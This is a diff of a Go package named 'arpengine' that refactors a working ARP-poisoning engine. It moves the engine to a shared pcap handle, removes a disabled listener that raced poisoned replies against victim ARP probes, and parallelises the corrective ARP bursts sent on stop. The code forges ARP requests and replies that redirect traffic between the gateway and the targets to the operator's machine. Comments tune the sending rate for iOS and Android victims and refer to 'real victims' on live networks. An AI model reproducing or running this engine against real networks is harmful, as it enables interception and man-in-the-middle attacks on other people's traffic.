@@ -3,7 +3,6 @@
 package arpengine
 
 import (
-	"bytes"
 	"context"
 	"errors"
 	"fmt"
@@ -11,8 +10,6 @@ import (
 	"sync"
 	"time"
 
-	"github.com/google/gopacket"
-	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 )
 
@@ -33,20 +30,33 @@ type ActivePoison struct {
 }
 
 // Engine manages the set of in-flight ARP poisons.
+//
+// The engine owns a single shared pcap handle for all sends — both the
+// per-target cadence loops and the post-stop corrective bursts. libpcap's
+// WritePacketData is not goroutine-safe, so writes are serialised through
+// handleMu. Per-target Open()/Close() in v1 was both expensive (N
+// fd allocations + libpcap setup per Start) and racy with handle
+// teardown during StopAll. Sharing one handle is faster, simpler, and
+// removes the per-target failure mode of "couldn't open pcap for
+// corrective".
 type Engine struct {
 	iface   string
 	opMAC   net.HardwareAddr
 	cadence time.Duration
-	mu      sync.Mutex
-	active  map[string]*runner // key: TargetMAC.String()
+
+	handleMu sync.Mutex // serialises WritePacketData (libpcap is not goroutine-safe)
+	handle   *pcap.Handle
+
+	mu     sync.Mutex
+	active map[string]*runner // key: TargetMAC.String()
+	closed bool
 }
 
 type runner struct {
-	target       Target
-	cancel       context.CancelFunc
-	started      time.Time
-	done         chan struct{} // closed when poison goroutine exits
-	listenerDone chan struct{} // closed when raceListener goroutine exits
+	target  Target
+	cancel  context.CancelFunc
+	started time.Time
+	done    chan struct{} // closed when poison goroutine exits
 }
 
 // copyTarget returns a deep copy of t so callers can't mutate engine-internal
@@ -62,11 +72,11 @@ func copyTarget(t Target) Target {
 
 // New returns an engine bound to a specific interface and operator MAC.
 // cadence=0 selects the default of 1 second (1 Hz × 4 frames/cycle =
-// 4 frames/sec/target). This rate is conservative but is the only one
-// that empirically keeps the corrective-on-clear path reliable in
-// integration tests — sub-second cadence reinforces the receiver's
-// neighbour entry so often that the corrective burst can't always
-// dislodge it within the test's deadline.
+// 4 frames/sec/target). Default rationale: the only cadence that
+// empirically keeps the corrective-on-clear path reliable in integration
+// tests — sub-second cadence reinforces the receiver's neighbour entry
+// so often that the corrective burst can't always dislodge it within
+// the test's deadline.
 //
 // Operators on networks where the receiver auto-refreshes faster than
 // 1 Hz (modern Android/iOS especially) should crank this down via the
@@ -74,11 +84,48 @@ func copyTarget(t Target) Target {
 // `50ms` (~80 fps) handles stubborn iOS. Just note that aggressive
 // cadence makes `policy clear` slower because the corrective has to
 // flood harder to win the cache back.
-func New(iface string, opMAC net.HardwareAddr, cadence time.Duration) *Engine {
+//
+// Returns an error if the shared pcap handle can't be opened (most
+// commonly: CAP_NET_RAW missing or iface doesn't exist). Callers should
+// surface this at daemon startup so the operator gets a clear failure
+// instead of a silent first-policy-fails-mysteriously later on.
+func New(iface string, opMAC net.HardwareAddr, cadence time.Duration) (*Engine, error) {
 	if cadence == 0 {
 		cadence = time.Second
 	}
-	return &Engine{iface: iface, opMAC: opMAC, cadence: cadence, active: map[string]*runner{}}
+	h, err := pcap.OpenLive(iface, 65536, false, pcap.BlockForever)
+	if err != nil {
+		return nil, fmt.Errorf("arpengine: open %s: %w", iface, err)
+	}
+	return &Engine{iface: iface, opMAC: opMAC, cadence: cadence, handle: h, active: map[string]*runner{}}, nil
+}
+
+// Close releases the shared pcap handle. Idempotent. Should be called
+// after StopAll() during daemon shutdown so any goroutine still trying
+// to write through write() gets a clean error instead of a use-after-free.
+func (e *Engine) Close() error {
+	e.handleMu.Lock()
+	defer e.handleMu.Unlock()
+	if e.handle == nil {
+		return nil
+	}
+	e.handle.Close()
+	e.handle = nil
+	e.closed = true
+	return nil
+}
+
+// write pushes a frame through the shared handle. Returns an error if
+// the engine has been closed (callers treat this as benign — Close is
+// only invoked at shutdown, and any in-flight goroutines about to write
+// would have already had their context cancelled).
+func (e *Engine) write(buf []byte) error {
+	e.handleMu.Lock()
+	defer e.handleMu.Unlock()
+	if e.handle == nil {
+		return errors.New("arpengine: closed")
+	}
+	return e.handle.WritePacketData(buf)
 }
 
 // Start begins poisoning t. Idempotent: starting an already-active target
@@ -86,109 +133,30 @@ func New(iface string, opMAC net.HardwareAddr, cadence time.Duration) *Engine {
 func (e *Engine) Start(t Target) error {
 	key := t.MAC.String()
 	e.mu.Lock()
+	if e.closed {
+		e.mu.Unlock()
+		return errors.New("arpengine: closed")
+	}
 	if _, exists := e.active[key]; exists {
 		e.mu.Unlock()
-		return nil
-	}
-	e.mu.Unlock()
-
-	handle, err := pcap.OpenLive(e.iface, 65536, false, pcap.BlockForever)
-	if err != nil {
-		return fmt.Errorf("open %s: %w", e.iface, err)
-	}
-
-	e.mu.Lock()
-	// Recheck after the gap — another caller may have started the same target.
-	if _, exists := e.active[key]; exists {
-		e.mu.Unlock()
-		handle.Close()
 		return nil
 	}
 	ctx, cancel := context.WithCancel(context.Background())
 	r := &runner{
-		target:       t,
-		cancel:       cancel,
-		started:      time.Now(),
-		done:         make(chan struct{}),
-		listenerDone: make(chan struct{}),
+		target:  t,
+		cancel:  cancel,
+		started: time.Now(),
+		done:    make(chan struct{}),
 	}
 	e.active[key] = r
 	e.mu.Unlock()
 
-	go e.loop(ctx, handle, t, r.done)
-	// raceListener was experimentally enabled here to emit poisoned
-	// replies on victim ARP probes. It works in real Wi-Fi setups but
-	// makes the integration tests intermittently flaky in netns labs
-	// (the constant cache reinforcement plus listener responses leaves
-	// lab-vic's NUD machine in a state the corrective can't always
-	// dislodge in 3s). Keep the implementation around — it's behind a
-	// future enableRaceListener flag — but default off for stability.
-	close(r.listenerDone)
+	go e.loop(ctx, t, r.done)
 	return nil
 }
 
-// raceListener watches for ARP traffic involving the target or gateway
-// and emits an immediate poisoned reply that races the real gateway's
-// response. Reads with a short timeout so we can exit cleanly on ctx
-// cancel without another goroutine calling Close() under us — that
-// pattern is racy in libpcap and tends to deadlock under load.
-func (e *Engine) raceListener(ctx context.Context, handle *pcap.Handle, t Target, done chan struct{}) {
+func (e *Engine) loop(ctx context.Context, t Target, done chan struct{}) {
 	defer close(done)
-	defer handle.Close()
-
-	repGwAtOp, _ := buildARPReply(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP)
-	repVicAtOp, _ := buildARPReply(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP)
-
-	tIP4 := t.IP.To4()
-	gwIP4 := t.GwIP.To4()
-
-	for {
-		if ctx.Err() != nil {
-			return
-		}
-		data, _, err := handle.ReadPacketData()
-		if err != nil {
-			// Timeout (no packet within the read window) or handle
-			// closed — either way, loop and re-check ctx.
-			if ctx.Err() != nil {
-				return
-			}
-			continue
-		}
-		// Re-check ctx between read and write: ReadPacketData might have
-		// returned a packet that arrived just before cancel, and we
-		// don't want to emit a poisoned reply after the engine has been
-		// asked to stop — that frame would race the corrective sends.
-		if ctx.Err() != nil {
-			return
-		}
-		pkt := gopacket.NewPacket(data, layers.LayerTypeEthernet, gopacket.NoCopy)
-		al := pkt.Layer(layers.LayerTypeARP)
-		if al == nil {
-			continue
-		}
-		arp := al.(*layers.ARP)
-		if arp.Operation != layers.ARPRequest {
-			continue
-		}
-		// Skip our own poison frames so we don't race ourselves into
-		// a self-feedback loop.
-		if bytes.Equal(arp.SourceHwAddress, e.opMAC) {
-			continue
-		}
-		dst := net.IP(arp.DstProtAddress).To4()
-		switch {
-		case dst.Equal(gwIP4):
-			_ = handle.WritePacketData(repGwAtOp)
-		case dst.Equal(tIP4):
-			_ = handle.WritePacketData(repVicAtOp)
-		}
-	}
-}
-
-func (e *Engine) loop(ctx context.Context, handle *pcap.Handle, t Target, done chan struct{}) {
-	defer close(done)
-	defer handle.Close()
 	tick := time.NewTicker(e.cadence)
 	defer tick.Stop()
 	send := func() {
@@ -197,17 +165,17 @@ func (e *Engine) loop(ctx context.Context, handle *pcap.Handle, t Target, done c
 		// = opMAC keeps the bridge FDB clean even though the ARP body
 		// claims someone else's MAC.
 		if f, err := buildARPRequest(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP); err == nil {
-			_ = handle.WritePacketData(f)
+			_ = e.write(f)
 		}
 		if f, err := buildARPReply(e.opMAC, e.opMAC, t.GwIP, t.MAC, t.IP); err == nil {
-			_ = handle.WritePacketData(f)
+			_ = e.write(f)
 		}
 		// Poison gateway's cache: "target IP is at op MAC".
 		if f, err := buildARPRequest(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP); err == nil {
-			_ = handle.WritePacketData(f)
+			_ = e.write(f)
 		}
 		if f, err := buildARPReply(e.opMAC, e.opMAC, t.IP, t.GwMAC, t.GwIP); err == nil {
-			_ = handle.WritePacketData(f)
+			_ = e.write(f)
 		}
 	}
 
@@ -225,7 +193,8 @@ func (e *Engine) loop(ctx context.Context, handle *pcap.Handle, t Target, done c
 // Stop halts poisoning of the named target and emits corrective ARPs
 // asserting the real (gw,target) mappings. Blocks until the poison
 // goroutine exits AND the corrective sequence completes — total wait is
-// approximately 3*cadence (default 3 s). No-op for unknown targets.
+// approximately 1.6 s (locktime + corrective burst). No-op for unknown
+// targets.
 func (e *Engine) Stop(t Target) error {
 	e.mu.Lock()
 	r, ok := e.active[t.MAC.String()]
@@ -236,29 +205,26 @@ func (e *Engine) Stop(t Target) error {
 	delete(e.active, t.MAC.String())
 	e.mu.Unlock()
 	r.cancel()
-	<-r.done         // poison goroutine stopped + its handle closed
-	<-r.listenerDone // raceListener stopped + its handle closed (no-op when listener disabled)
+	<-r.done
 
+	return e.sendCorrective(t)
+}
+
+// sendCorrective performs the post-stop corrective ARP burst for one
+// target. Split out from Stop so StopAll can run the per-target locktime
+// sleep + corrective burst in parallel — the kernel locktime is per
+// receiver (the target and the gateway), so concurrent correctives for
+// disjoint targets don't interfere. The actual frame writes serialise
+// through handleMu; that's fine because writes are negligible (~tens of
+// microseconds) compared to the locktime sleep (1.1 s) and the inter-
+// burst sleeps (5 × 100 ms).
+func (e *Engine) sendCorrective(t Target) error {
 	// Wait past Linux's neighbour-table locktime (default 1s) so the
 	// receiving kernel won't silently drop our corrective frames as a
 	// race with the just-completed poison send.
 	time.Sleep(1100 * time.Millisecond)
 
-	// now safe to open corrective handle
-	handle, err := pcap.OpenLive(e.iface, 65536, false, pcap.BlockForever)
-	if err != nil {
-		return fmt.Errorf("open %s for corrective: %w", e.iface, err)
-	}
-	defer handle.Close()
-	// Restore the real (gw, target) mappings on both sides. Send THREE
-	// forms per iteration so the receiver kernel cannot silently drop the
-	// update on any of its neighbour-state code paths:
-	//   - unicast ARP REQUEST: forces sender-info learning even on
-	//     REACHABLE entries (Linux's request handler always updates)
-	//   - unicast ARP REPLY: covers receivers that prefer reply-form
-	//   - gratuitous (broadcast) ARP REQUEST: tip==sip, flagged as
-	//     is_garp → NEIGH_UPDATE_F_OVERRIDE bypasses locktime
-	// ethL2Src=opMAC throughout keeps the bridge FDB clean.
+	// Build all six frames once, outside the burst loop.
 	reqGwToTarget, errGT := buildARPRequest(e.opMAC, t.GwMAC, t.GwIP, t.MAC, t.IP)
 	repGwToTarget, errGR := buildARPReply(e.opMAC, t.GwMAC, t.GwIP, t.MAC, t.IP)
 	reqTargetToGw, errTT := buildARPRequest(e.opMAC, t.MAC, t.IP, t.GwMAC, t.GwIP)
@@ -273,43 +239,71 @@ func (e *Engine) Stop(t Target) error {
 	// reliable in the netns lab integration tests.
 	for i := 0; i < 5; i++ {
 		if errGT == nil {
-			_ = handle.WritePacketData(reqGwToTarget)
+			_ = e.write(reqGwToTarget)
 		}
 		if errGR == nil {
-			_ = handle.WritePacketData(repGwToTarget)
+			_ = e.write(repGwToTarget)
 		}
 		if errTT == nil {
-			_ = handle.WritePacketData(reqTargetToGw)
+			_ = e.write(reqTargetToGw)
 		}
 		if errTR == nil {
-			_ = handle.WritePacketData(repTargetToGw)
+			_ = e.write(repTargetToGw)
 		}
 		if errG1 == nil {
-			_ = handle.WritePacketData(garpGw)
+			_ = e.write(garpGw)
 		}
 		if errG2 == nil {
-			_ = handle.WritePacketData(garpTarget)
+			_ = e.write(garpTarget)
 		}
 		time.Sleep(100 * time.Millisecond)
 	}
 	return nil
 }
 
-// StopAll halts every active poison. Errors are aggregated.
+// StopAll halts every active poison concurrently. The 1.1 s locktime
+// sleep + 500 ms corrective burst is per-receiver, so running disjoint
+// targets in parallel takes ~1.6 s total instead of N × 1.6 s. Errors
+// are aggregated.
+//
+// Why this matters: scripts/shardflow-up gives the daemon a 5-second
+// SIGTERM grace window before SIGKILL. Sequential cleanup of 4+ active
+// poisons would blow that budget and leave real victims poisoned.
 func (e *Engine) StopAll() error {
 	e.mu.Lock()
+	runners := make([]*runner, 0, len(e.active))
 	targets := make([]Target, 0, len(e.active))
-	for _, r := range e.active {
+	for k, r := range e.active {
+		runners = append(runners, r)
 		targets = append(targets, r.target)
+		delete(e.active, k)
 	}
 	e.mu.Unlock()
-	var errs []error
-	for _, t := range targets {
-		if err := e.Stop(t); err != nil {
-			errs = append(errs, err)
+
+	for _, r := range runners {
+		r.cancel()
+		<-r.done
+	}
+
+	var wg sync.WaitGroup
+	errs := make([]error, len(targets))
+	for i := range targets {
+		i, t := i, targets[i]
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			errs[i] = e.sendCorrective(t)
+		}()
+	}
+	wg.Wait()
+
+	var nonNil []error
+	for _, e := range errs {
+		if e != nil {
+			nonNil = append(nonNil, e)
 		}
 	}
-	return errors.Join(errs...)
+	return errors.Join(nonNil...)
 }
 
 // Active returns a snapshot of in-flight poisons.
